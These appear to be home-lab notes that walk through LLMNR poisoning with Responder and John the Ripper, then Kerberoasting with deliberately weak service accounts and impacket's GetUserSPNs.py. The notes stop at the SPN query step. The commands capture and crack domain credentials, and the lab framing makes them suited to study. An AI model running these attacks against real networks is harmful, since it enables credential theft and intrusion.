# LLMNR poisoning

# prerequesite: franky.lanie domain user changes logs in on the Win 10 machine using default password -> is prompted to change the password -> changes it to smth simple: Password123

# 1. on Kali linux: 

sudo responder -I eth1

# 2. on Win 10 client logged in as franky.lanie: File Explorer -> search for \\secretFile  (to initiate LLMNR event)

# 3. on Kali: catch the hash -> put into hash2.txt ; download if needed rockyou.txt
#Run

john --format=netntlmv2 --wordlist=rockyou.txt hash2.txt # to start cracking

john --show hash2.txt # to see the cracked password




###############################################################################################################################################################################################################

# Kerberoasting

# Required setup for an AD home lab that does not have any service accounts with SPNs registered. In a real setting, it is expected that there are already existing SPNs, so skip this step. 

# 1. First, two service accounts are created, svcWeb with an easy to break password, and svcSQL with a difficult to break password. The motivation for this is investigating how big of a difference a strong password makes in decryption attempts.


# In PowerShell on DC (or other server VM):

# Create account with easy to break password
New-ADUser svcWeb  -SamAccountName svcWeb  -AccountPassword (ConvertTo-SecureString 'P@55w0rd!' -AsPlainText -Force) -Enabled $true

# Create account with strong password
New-ADUser svcSQL  -SamAccountName svcSQL  -AccountPassword (ConvertTo-SecureString '!TryBr3akMeN0tPoss#bleY' -AsPlainText -Force) -Enabled $true

# 2. Next, we assigned the HTTP service to the svcWeb account (guessable password service account) and registered its SPN. We then configured the MSSQL service under svcSQL (hard to break password) and registered its SPN. 
# Once the SPNs are created in the AD, we can proceed to the attack itself. 


# In PowerShell, still on the DC, run:

# HTTP service on the DC itself
setspn -s HTTP/DomainC.offensive.local svcWeb

# MSSQL service on the DC
setspn -s MSSQLSvc/DomainC.offensive.local:1433 svcSQL

  
# Attack prerequisite: A user account with their credentials is needed for the attack. For now, assumed breach.

#Step 1: Find if any SNPs are available. Install impacket: sudo apt install python3-impacket
# Navigate to the python3-impacket/examples folder on your machine. Usually in /usr/share/doc/python3-impacket/examples. Run the following:

python3 GetUserSPNs.py\
  offensive.local/franky.lanie:Password123  \ 
 -dc-ip 192.168.56.2

